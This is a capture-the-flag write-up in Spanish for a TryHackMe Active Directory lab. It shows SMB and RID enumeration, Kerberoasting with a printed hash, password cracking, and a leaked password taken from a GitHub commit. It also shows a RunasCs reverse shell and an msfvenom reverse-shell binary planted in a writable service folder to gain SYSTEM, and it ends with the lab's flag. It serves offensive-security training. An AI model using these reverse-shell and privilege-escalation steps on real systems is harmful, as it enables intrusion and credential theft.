---
tags:
title: Enterprise - Hard  (THM)
permalink: /Enterprise-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.66.156.60
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 19:41 -0400
Initiating Ping Scan at 19:41
Scanning 10.66.156.60 [4 ports]
Completed Ping Scan at 19:41, 0.40s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:41
Completed Parallel DNS resolution of 1 host. at 19:41, 0.50s elapsed
Initiating SYN Stealth Scan at 19:41
Scanning 10.66.156.60 [65535 ports]
Discovered open port 53/tcp on 10.66.156.60
Discovered open port 445/tcp on 10.66.156.60
Discovered open port 139/tcp on 10.66.156.60
Discovered open port 80/tcp on 10.66.156.60
Discovered open port 3389/tcp on 10.66.156.60
Discovered open port 135/tcp on 10.66.156.60
Discovered open port 49671/tcp on 10.66.156.60
Discovered open port 49671/tcp on 10.66.156.60
Discovered open port 49673/tcp on 10.66.156.60
Discovered open port 5985/tcp on 10.66.156.60
Discovered open port 389/tcp on 10.66.156.60
Discovered open port 49667/tcp on 10.66.156.60
Discovered open port 49676/tcp on 10.66.156.60
Discovered open port 49664/tcp on 10.66.156.60
Discovered open port 464/tcp on 10.66.156.60
Discovered open port 47001/tcp on 10.66.156.60
Discovered open port 88/tcp on 10.66.156.60
Discovered open port 636/tcp on 10.66.156.60
Discovered open port 593/tcp on 10.66.156.60
Discovered open port 49665/tcp on 10.66.156.60
Discovered open port 7990/tcp on 10.66.156.60
Discovered open port 49669/tcp on 10.66.156.60
Discovered open port 49668/tcp on 10.66.156.60
Completed SYN Stealth Scan at 19:42, 22.03s elapsed (65535 total ports)
Nmap scan report for 10.66.156.60
Host is up, received echo-reply ttl 126 (0.49s latency).
Scanned at 2026-03-23 19:41:45 EDT for 22s
Not shown: 47758 closed tcp ports (reset), 17755 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 126
80/tcp    open  http           syn-ack ttl 126
88/tcp    open  kerberos-sec   syn-ack ttl 126
135/tcp   open  msrpc          syn-ack ttl 126
139/tcp   open  netbios-ssn    syn-ack ttl 126
389/tcp   open  ldap           syn-ack ttl 126
445/tcp   open  microsoft-ds   syn-ack ttl 126
464/tcp   open  kpasswd5       syn-ack ttl 126
593/tcp   open  http-rpc-epmap syn-ack ttl 126
636/tcp   open  ldapssl        syn-ack ttl 126
3389/tcp  open  ms-wbt-server  syn-ack ttl 126
5985/tcp  open  wsman          syn-ack ttl 126
7990/tcp  open  unknown        syn-ack ttl 126
47001/tcp open  winrm          syn-ack ttl 126
49664/tcp open  unknown        syn-ack ttl 126
49665/tcp open  unknown        syn-ack ttl 126
49667/tcp open  unknown        syn-ack ttl 126
49668/tcp open  unknown        syn-ack ttl 126
49669/tcp open  unknown        syn-ack ttl 126
49671/tcp open  unknown        syn-ack ttl 126
49673/tcp open  unknown        syn-ack ttl 126
49676/tcp open  unknown        syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.11 seconds
           Raw packets sent: 212400 (9.346MB) | Rcvd: 49101 (1.965MB)
-e [*] IP: 10.66.156.60
[*] Puertos abiertos: 53,80,88,135,139,389,445,464,593,636,3389,5985,7990,47001,49664,49665,49667,49668,49669,49671,49673,49676
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,80,88,135,139,389,445,464,593,636,3389,5985,7990,47001,49664,49665,49667,49668,49669,49671,49673,49676 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 19:42 -0400
Nmap scan report for 10.66.156.60
Host is up (0.28s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-23 23:42:17Z)
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  tcpwrapped
636/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
|_ssl-date: 2026-03-23T23:43:38+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2026-03-22T23:41:33
|_Not valid after:  2026-09-21T23:41:33
5985/tcp  open  tcpwrapped
7990/tcp  open  tcpwrapped
47001/tcp open  tcpwrapped
49664/tcp open  tcpwrapped
49665/tcp open  tcpwrapped
49667/tcp open  tcpwrapped
49668/tcp open  tcpwrapped
49669/tcp open  tcpwrapped
49671/tcp open  tcpwrapped
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-23T23:43:23
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -4s, deviation: 0s, median: -4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.93 seconds
```

## Website

En la pagina principal, solo muestra el siguiente mensaje.

![[Pasted image 20260323204259.png]]
### SMB Enumeration

Como el inicio de sesión `null` esta habilitado, me conecte como el usuario guest, viendo que tiene acceso al recurso `Docs`, y además a `Users`.

```bash
zs1n@ptw ~> impacket-smbclient LAB.ENTERPRISE.THM/guest@LAB-DC.LAB.ENTERPRISE.THM -no-pass
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Docs
IPC$
NETLOGON
SYSVOL
Users
```

Dentro de `Docs`, hay dos archivos los cuales me baje para analizar pero estan protegidos con contrasena, donde al extraer un hash de los mismos no pude romper nada.

```bash
ls
# ls
drw-rw-rw-          0  Sun Mar 14 22:47:35 2021 .
drw-rw-rw-          0  Sun Mar 14 22:47:35 2021 ..
-rw-rw-rw-      15360  Sun Mar 14 22:47:35 2021 RSA-Secured-Credentials.xlsx
-rw-rw-rw-      18432  Sun Mar 14 22:47:49 2021 RSA-Secured-Document-PII.docx
# mget *
```
### User enumeration

Además enumere usuarios basados en el RID de los mismos con `nxc`.

```bash
zs1n@ptw ~> nxc smb 10.66.156.60 -u guest -p '' --rid-brute
SMB         10.66.156.60    445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.156.60    445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest:
SMB         10.66.156.60    445    LAB-DC           500: LAB-ENTERPRISE\Administrator (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           501: LAB-ENTERPRISE\Guest (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
SMB         10.66.156.60    445    LAB-DC           520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
SMB         10.66.156.60    445    LAB-DC           571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.66.156.60    445    LAB-DC           572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.66.156.60    445    LAB-DC           1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
SMB         10.66.156.60    445    LAB-DC           1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1107: LAB-ENTERPRISE\nik (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1108: LAB-ENTERPRISE\replication (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1109: LAB-ENTERPRISE\spooks (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1110: LAB-ENTERPRISE\korone (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1111: LAB-ENTERPRISE\banana (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1112: LAB-ENTERPRISE\Cake (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1117: LAB-ENTERPRISE\varg (SidTypeUser)
SMB         10.66.156.60    445    LAB-DC           1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
SMB         10.66.156.60    445    LAB-DC           1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```
### Kerberoasting

Con la lista de usuarios validos que recolecte, realice un `Kerberoasting` contra los mismos, obteniendo así el hash del usuario `bitbucket`.

```bash
zs1n@ptw ~> impacket-GetUserSPNs LAB.ENTERPRISE.THM/guest@LAB-DC.LAB.ENTERPRISE.THM -no-pass -usersfile users
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] Principal: atlbitbucket - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
..snip..
[-] Principal: ENTERPRISE$ - [Errno Connection error (ENTERPRISE$:88)] [Errno -2] Name or service not known
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$bitbucket*$ca3a012892daf3718a0f7ff2917927d7$8857eb90cb5ddfe068d92fb97549995377ce3845c5fb6a67cedbc8614845b93b804c0cf4419301759cf66177dd2614f4ef28d22e41a3e17efb3c2a72934c54b584a7dedada7dd861a06076d2ac0c83206f179cdccba8faff54d75481dc4e7de2f97db43cab77063dd0df0b32cde4b2722fe3841725f2de5042b7d8f106c9ded6c63190e66487270f024ad3506d1fd050fdebc39adf1a11ec8886670a2680232f1cd6ce00a07fe71742c3c5f668a523c9fcce4ea8d05045ad96504d36fd8bd65c2e0a863b3198a340f4a8249987de8a4de6147cae6bd4f7fbb23736e07248f66b182571ea95605392f3fc15bbe79bafa8dd28607425c9f175fab608766ae36dd40fd2809cf401811a6f9f0ef74fb9ca71790f21ab668776c4631cf3e2be2b940603b1ae0a9f5322f82a1d62fbaa171af93e52215e04d88f563798774408cc6967e61d4fa38ba684d8c9bc5b6616717ba5a147e07ab3a1d9d0dfa922841115bb7f7bac6de19fcac100279dde86a18901d25f4c9d4aaf52c428f8d08bde0e4d586e7171e697d1b842cd4ac8bac1f5e0272cff06b0f64345c56326066bcc961d633c7cc285f45b365422c9b068465832e6b93feaad6ec919e0e2a09cb234f277d3af935023467d2a71e1933e1734b5d0375db8b6363e647951a7295964cee2c1f09b3402aab98f254e36472468440f54fb6ea4f4a6800ea9f52be4526d9b211eef5bbbefab243e056343ed1ba1003b564c26af1601d6c68d13c1d78b9d7506184f4c6ef0024aac99ecdca563cf65caadedecebbe67510b415494847309fec28d05a8839d6a27e4ca4912d54bddf0c3ce7deacca294e89144c0467a3a41faec13ea908b3968dc6434d56bad0fec68de5b4f73e9dcc212ce15e64bbaaf6a626b39762d80c599c5e4b880f6a856ba36d051200e4119099fad903e14f8b929e61fd38faab9c86caf04b3c031ba5b21f707e6205c99dd25ac82d58c202ab4f6d730f79235c9faf450e89ea9052420f862bfa917c7fe88997948e257185c4e41386bed0a1ee69c57b66c1dad7f5c33a741897c501ec4df42b218ab92743306abad02cd3fc770b51d243e49db4250683adf4edfe4bd1861d91986ddb25eea10b7914af13b2c3343b6be25f4932645ef956b082ff985c855e3706c5e29d293ce6620bb42e5b729ee58ab1341432137ae487bd8833c42f69e6d5765bc7e14a6759d91e823a807a9a060d5434b052dc3795339ed83091c9b966fe7367dec3741c8718870ae700162d1a156e30a4b4e4b6b41cc3f8e3ce750bdff1fe959a01379289cf3a48cf7bbbaf0ffd0df207880d764076ce11a20e7d92fdfb4e3d93551e77e610198
[-] Principal: nik - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: replication - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: spooks - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: korone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: banana - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Cake - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: contractor-temp - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: varg - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: joiner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
### Crack password

El hash lo rompí con `john` obteniendo así, la contraseña del usuario.

```bash
zs1n@ptw ~> j hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littleredbucket  (?)
1g 0:00:00:00 DONE (2026-03-23 19:53) 1.538g/s 2416Kp/s 2416Kc/s 2416KC/s livelife93..liss27
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Github proyect

Como en la pagina que corre por el puerto `7990` aparece un mensaje como este:

![[Pasted image 20260326123426.png]]
### Shell as nik
Busque en Github alguna cuenta con este nombre, encontrando el [siguiente repositorio](https://github.com/Enterprise-THM).
En `People` vi el nombre de uno de los integrantes del proyecto.

![[Pasted image 20260323213847.png]]

Donde si me voy a sus repositorios personales, vi un `.ps1` con un commit viejo, el cual tiene sus credenciales.

![[Pasted image 20260323213932.png]]

Codigo:
```powershell
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

Usando el propio [RunasCs.exe](https://github.com/antonioCoco/RunasCs), y estas credenciales me envié una shell a mi maquina.

```powershell
PS C:\programdata> .\runas.exe nik ToastyBoi! cmd.exe -r 192.168.210.140:4444 -l 3
[*] Warning: User profile directory for user nik does not exists. Use --force-profile if you want to force the creation.

[+] Running in session 2 with process function CreateProcessAsUserW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 5984 created in background.
```

Recibiéndola desde mi otra consola.

```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.66.156.60] 50916
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
lab-enterprise\nik
```
### Binary hijacking

Viendo los programas instalados, vi un `Zero Tier`.

```BASH
PS C:\Program Files (x86)\Zero Tier> get-service | findstr zero*
Stopped  zerotieroneservice zerotieroneservice
```
### Malicious Binary

En la carpeta del mismo tengo permisos de escritura y por ende tengo la capacidad de parar, reiniciar y correr el servicio, por lo que cree un paylaod malicioso con `msfvenom`.

```BASH
zs1n@ptw ~> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.210.140 LPORT=4444 -f exe -o Zero.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: Zero.exe
```
### Reset service

Luego de subirlo y colocarlo en la carpeta, cori el servicio, lo pare y lo volví a empezar.

```powershell
PS C:\Program Files (x86)\Zero Tier> sc start "zerotieroneservice"
PS C:\Program Files (x86)\Zero Tier> Stop-Service -Name "zerotieroneservice"
PS C:\Program Files (x86)\Zero Tier> Start-Service -Name "zerotieroneservice"
```
### Shell

Viendo como desde mi listener recibo la conexión como `system`.

```BASH
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.66.156.60] 51942
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1a1fa94875421296331f145971ca4881}
```

`~Happy Hacking.`